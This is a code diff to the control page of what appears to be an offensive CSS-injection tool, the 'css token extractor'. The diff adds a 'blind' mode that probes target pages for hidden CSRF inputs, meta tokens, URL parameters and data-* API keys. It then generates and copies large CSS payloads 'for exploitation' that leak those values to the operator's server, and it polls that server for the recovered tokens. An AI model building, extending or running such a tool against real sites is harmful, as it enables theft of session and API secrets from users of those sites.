@@ -145,6 +145,20 @@
     50% { opacity: 0.3; }
   }
 
+  .mode-switch { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
+  .mode-switch .btn { min-width: 120px; }
+  .hidden-mode { display: none !important; }
+  .targets { display: flex; gap: 16px; flex-wrap: wrap; font-size: 13px; margin-bottom: 12px; }
+  .targets label, .field-row label { cursor: pointer; }
+  .field-row { display: flex; gap: 12px; align-items: center; font-size: 13px; padding: 4px 0; border-bottom: 1px solid #1a1a1a; }
+  .field-row .name { color: #e0e0e0; flex: 1; word-break: break-all; }
+  .badge { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; padding: 1px 6px; border-radius: 3px; border: 1px solid #333; color: #555; }
+  .badge.hex { color: #00ff41; border-color: #00ff41; }
+  .badge.nohex { color: #ff5555; border-color: #ff5555; }
+  .result { margin-bottom: 10px; }
+  .result .label { font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
+  .note { font-size: 12px; color: #555; margin-top: 8px; }
+
   #testArea a { color: #e0e0e0; text-decoration: none; word-break: break-all; }
   #testArea span { display: block; }
 </style>
@@ -156,7 +170,12 @@
     <div class="subtitle">css token extractor</div>
   </div>
 
-  <div class="panel">
+  <div class="mode-switch">
+    <button class="btn" id="modeTargeted">targeted</button>
+    <button class="btn btn-outline" id="modeBlind">blind</button>
+  </div>
+
+  <div class="panel targeted-only">
     <div class="panel-header">configuration</div>
     <div class="config-row">
       <span class="config-label">type</span>
@@ -202,7 +221,7 @@
     </div>
   </div>
 
-  <div class="panel">
+  <div class="panel targeted-only">
     <div class="panel-header">payload</div>
     <div class="actions">
       <select id="copyMode" class="config-input" style="flex:none;width:220px">
@@ -214,9 +233,59 @@
     </div>
   </div>
 
-  <div class="panel">
+  <div class="panel targeted-only">
     <div class="panel-header">sample token</div>
     <div class="token-box" id="sampleToken">-</div>
+  </div>
+
+  <div class="panel blind-only hidden-mode">
+    <div class="panel-header">1. recon</div>
+    <div class="targets">
+      <label><input type="checkbox" class="target" value="input" checked> input[value]</label>
+      <label><input type="checkbox" class="target" value="meta" checked> meta[content]</label>
+      <label><input type="checkbox" class="target" value="url" checked> a[href] / form[action] params</label>
+      <label><input type="checkbox" class="target" value="data" checked> data-* attributes</label>
+    </div>
+    <div class="actions">
+      <select id="reconCopyMode" class="config-input" style="flex:none;width:220px">
+        <option value="test">Copy as HTML for test</option>
+        <option value="exploit">Copy as text for exploitation</option>
+      </select>
+      <button class="btn" id="reconCopyBtn">copy recon payload</button>
+      <span class="status" id="reconCopyStatus"></span>
+    </div>
+    <div class="note">Wordlist probes for field names, which element can host the requests, and whether each value is lowercase hex. Inject it, then pick fields below.</div>
+  </div>
+
+  <div class="panel blind-only hidden-mode">
+    <div class="panel-header"><span class="indicator" id="reconDot"></span>2. discovered fields</div>
+    <div id="fieldList" class="token-box muted">waiting for recon...</div>
+    <div style="margin-top:12px" class="actions">
+      <select id="blindWindow" class="config-input" style="flex:none;width:300px">
+        <option value="4">4 chars &mdash; accurate, ~7 MB/field</option>
+        <option value="3">3 chars &mdash; ~0.5 MB/field, candidates</option>
+      </select>
+      <select id="blindCopyMode" class="config-input" style="flex:none;width:220px">
+        <option value="test">Copy as HTML for test</option>
+        <option value="exploit">Copy as text for exploitation</option>
+      </select>
+      <button class="btn" id="blindCopyBtn">copy extract payload</button>
+      <span class="status" id="blindCopyStatus"></span>
+    </div>
+  </div>
+
+  <div class="panel blind-only hidden-mode">
+    <div class="panel-header">blind sample tokens</div>
+    <div class="token-box" id="blindSample">-</div>
+  </div>
+
+  <div class="panel blind-only hidden-mode">
+    <div class="panel-header"><span class="indicator" id="blindDot"></span>3. extracted tokens</div>
+    <div class="token-box muted" id="blindResults">waiting for extraction...</div>
+    <div style="margin-top:12px" class="actions">
+      <button class="btn btn-outline" id="blindRefreshBtn">refresh</button>
+      <button class="btn btn-outline" id="blindResetBtn">reset</button>
+    </div>
   </div>
 
   <div class="panel">
@@ -224,7 +293,7 @@
     <div id="testArea" contenteditable="true" style="background:#0a0a0a;border:1px solid #222;border-radius:4px;padding:16px;min-height:60px;color:#888;font-size:13px">paste css here to test extraction</div>
   </div>
 
-  <div class="panel">
+  <div class="panel targeted-only">
     <div class="panel-header"><span class="indicator" id="statusDot"></span>extracted token</div>
     <div class="token-box muted" id="extractedToken">waiting for extraction...</div>
     <div style="margin-top:12px" class="actions">
@@ -235,6 +304,7 @@
 </div>
 
 <script src="/payload.js"></script>
+<script src="/blind.js"></script>
 <script>
 let CONFIG = null;
 
@@ -369,7 +439,7 @@ async function init() {
   testArea.addEventListener('paste', (e) => {
     e.preventDefault();
     const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
-    testArea.innerHTML = html + CONFIG.sampleHtml;
+    testArea.innerHTML = html + (MODE === 'blind' ? BLIND_SAMPLE.html : (CONFIG ? CONFIG.sampleHtml : ''));
   });
 
   document.getElementById('cfgType').addEventListener('change', (e) => {
@@ -406,11 +476,193 @@ async function init() {
     document.getElementById('statusDot').className = 'indicator';
   });
 
-  // Keep polling so later extractions (after reset or a new config) show up.
-  setInterval(checkToken, 2000);
+  // Keep polling so later extractions (after reset or a new config) show up,
+  // but only while targeted mode is showing (blind mode has its own poll).
+  setInterval(() => { if (MODE === 'targeted') checkToken(); }, 2000);
 }
 
-init();
+// --- blind mode ---------------------------------------------------------------
+
+let MODE = 'targeted';
+let BLIND_FIELDS = [];
+
+const escapeHtml = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+const randomHex = n => Array.from(crypto.getRandomValues(new Uint8Array(Math.ceil(n / 2))), b => b.toString(16).padStart(2, '0')).join('').slice(0, n);
+
+// A page with one field of each kind recon looks for, so both stages can be
+// tried in the test area.
+function makeBlindSample() {
+  const t = { csrf: randomHex(40), meta: randomHex(32), code: randomHex(24), data: randomHex(32) };
+  const html =
+    `<meta name="csrf-token" content="${t.meta}">` +
+    `<form action="/login"><input type="hidden" name="csrf_token" value="${t.csrf}">` +
+    `<input type="hidden" name="lang" value="en"><span>login form</span></form>` +
+    `<a href="https://example.com/verify?user=7&code=${t.code}&next=home">verify link</a>` +
+    `<span data-api-key="${t.data}">widget</span>`;
+  return {
+    tokens: t,
+    html,
+    text: `csrf_token: ${t.csrf}\nmeta csrf-token: ${t.meta}\na ?code=: ${t.code}\ndata-api-key: ${t.data}`,
+  };
+}
+let BLIND_SAMPLE = makeBlindSample();
+
+function setMode(mode) {
+  MODE = mode;
+  document.querySelectorAll('.targeted-only').forEach(e => e.classList.toggle('hidden-mode', mode !== 'targeted'));
+  document.querySelectorAll('.blind-only').forEach(e => e.classList.toggle('hidden-mode', mode !== 'blind'));
+  document.getElementById('modeTargeted').className = 'btn' + (mode === 'targeted' ? '' : ' btn-outline');
+  document.getElementById('modeBlind').className = 'btn' + (mode === 'blind' ? '' : ' btn-outline');
+  // CONFIG can be null if the initial /config fetch failed; don't crash the switch.
+  document.getElementById('testArea').innerHTML = mode === 'blind' ? BLIND_SAMPLE.html : (CONFIG ? CONFIG.sampleHtml : '');
+}
+
+async function copyPayload(css, mode, statusEl) {
+  try {
+    if (mode === 'test') await copyAsHtml(css);
+    else await navigator.clipboard.writeText(css);
+    statusEl.textContent = 'copied (' + (css.length / 1024 / 1024).toFixed(2) + ' MB)';
+    statusEl.className = 'status ok';
+  } catch (e) {
+    statusEl.textContent = 'clipboard failed';
+    statusEl.className = 'status';
+  }
+  setTimeout(() => { statusEl.textContent = ''; }, 2000);
+}
+
+function renderFields(data) {
+  const box = document.getElementById('fieldList');
+  const dot = document.getElementById('reconDot');
+  if (data.status === 'waiting') {
+    box.textContent = 'waiting for recon...';
+    box.classList.add('muted');
+    dot.className = 'indicator';
+    return;
+  }
+  if (data.status === 'partial') {
+    box.textContent = 'receiving recon hits... (' + data.hits + ' so far)';
+    box.classList.add('muted');
+    dot.className = 'indicator active';
+    return;
+  }
+  dot.className = 'indicator done';
+  const key = f => f.kind + ':' + f.name;
+  const same = BLIND_FIELDS.length === data.fields.length && BLIND_FIELDS.every((f, i) => key(f) === key(data.fields[i]) && f.host === data.fields[i].host);
+  if (same && box.dataset.rendered) return; // keep the user's checkbox choices
+  BLIND_FIELDS = data.fields;
+  box.dataset.rendered = '1';
+  box.classList.remove('muted');
+  if (!data.fields.length) {
+    box.innerHTML = 'no wordlist fields found' + (data.unlistedInputs ? '<div class="note">there are hidden inputs with names not in the wordlist</div>' : '');
+    return;
+  }
+  const label = { input: 'input', meta: 'meta', a: 'a href param', form: 'form action param', data: 'data attr' };
+  box.innerHTML = data.fields.map((f, i) => {
+    const hex = f.hex === true ? '<span class="badge hex">hex</span>' : f.hex === false ? '<span class="badge nohex">not hex</span>' : '<span class="badge">hex?</span>';
+    return `<div class="field-row"><label><input type="checkbox" class="field-pick" data-i="${i}" ${f.hex === false ? '' : 'checked'}></label>` +
+      `<span class="name">${escapeHtml(f.name)}</span><span class="badge">${label[f.kind]}</span><span class="badge">host: ${f.host}</span>${hex}</div>`;
+  }).join('') + (data.unlistedInputs ? '<div class="note">there are also hidden inputs with names not in the wordlist</div>' : '');
+}
+
+async function checkRecon() {
+  try { renderFields(await (await fetch('/api/recon')).json()); } catch {}
+}
+
+function renderResults(data) {
+  const box = document.getElementById('blindResults');
+  const dot = document.getElementById('blindDot');
+  if (data.status === 'waiting') {
+    box.textContent = 'waiting for extraction...';
+    box.classList.add('muted');
+    dot.className = 'indicator';
+    return;
+  }
+  if (data.status === 'partial') {
+    box.textContent = 'receiving chunks... (' + data.hits + ' so far)';
+    box.classList.add('muted');
+    dot.className = 'indicator active';
+    return;
+  }
+  dot.className = 'indicator done';
+  box.classList.remove('muted');
+  box.innerHTML = data.results.map(r => {
+    let body;
+    if (r.status === 'ok' && r.candidates) {
+      body = '<span style="color:#ff0">ambiguous (' + r.candidates.length + (r.truncated ? '+' : '') + ' candidates):</span><br>' +
+        r.candidates.map(escapeHtml).join('<br>');
+    } else if (r.status === 'ok') {
+      body = escapeHtml(r.token);
+    } else if (r.status === 'failed') {
+      body = '<span style="color:#ff5555">no hex token recovered (value may not be pure lowercase hex)</span>';
+    } else {
+      body = '<span style="color:#555">no requests for this field</span>';
+    }
+    return `<div class="result"><div class="label">${escapeHtml(r.kind)} ${escapeHtml(r.name)}</div>${body}</div>`;
+  }).join('');
+}
+
+async function checkBlindTokens() {
+  try { renderResults(await (await fetch('/api/blind/tokens')).json()); } catch {}
+}
+
+function initBlind() {
+  document.getElementById('blindSample').innerText = BLIND_SAMPLE.text;
+  document.getElementById('modeTargeted').addEventListener('click', () => setMode('targeted'));
+  document.getElementById('modeBlind').addEventListener('click', () => setMode('blind'));
+
+  document.getElementById('reconCopyBtn').addEventListener('click', () => {
+    const targets = [...document.querySelectorAll('.target:checked')].map(e => e.value);
+    const status = document.getElementById('reconCopyStatus');
+    if (!targets.length) {
+      status.textContent = 'pick at least one target';
+      status.className = 'status';
+      return;
+    }
+    const css = FragBlind.generateReconCSS({ targets }, window.location.origin);
+    copyPayload(css, document.getElementById('reconCopyMode').value, status);
+  });
+
+  document.getElementById('blindCopyBtn').addEventListener('click', async () => {
+    const status = document.getElementById('blindCopyStatus');
+    const windowSize = parseInt(document.getElementById('blindWindow').value, 10);
+    const picked = [...document.querySelectorAll('.field-pick:checked')].map(e => BLIND_FIELDS[e.dataset.i]);
+    if (!picked.length) {
+      status.textContent = 'pick at least one field';
+      status.className = 'status';
+      return;
+    }
+    const res = await fetch('/api/blind', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ fields: picked.map(f => ({ ...f, windowSize })) }),
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      status.textContent = data.error || 'failed';
+      status.className = 'status';
+      return;
+    }
+    renderResults({ status: 'waiting' });
+    copyPayload(FragBlind.generateBlindCSS(data.fields, window.location.origin), document.getElementById('blindCopyMode').value, status);
+  });
+
+  document.getElementById('blindRefreshBtn').addEventListener('click', () => { checkRecon(); checkBlindTokens(); });
+  document.getElementById('blindResetBtn').addEventListener('click', async () => {
+    await fetch('/api/blind/reset');
+    BLIND_FIELDS = [];
+    delete document.getElementById('fieldList').dataset.rendered;
+    renderFields({ status: 'waiting' });
+    renderResults({ status: 'waiting' });
+  });
+
+  setInterval(() => {
+    if (MODE !== 'blind') return;
+    checkRecon();
+    checkBlindTokens();
+  }, 2000);
+}
+
+init().then(initBlind);
 </script>
 </body>
 </html>
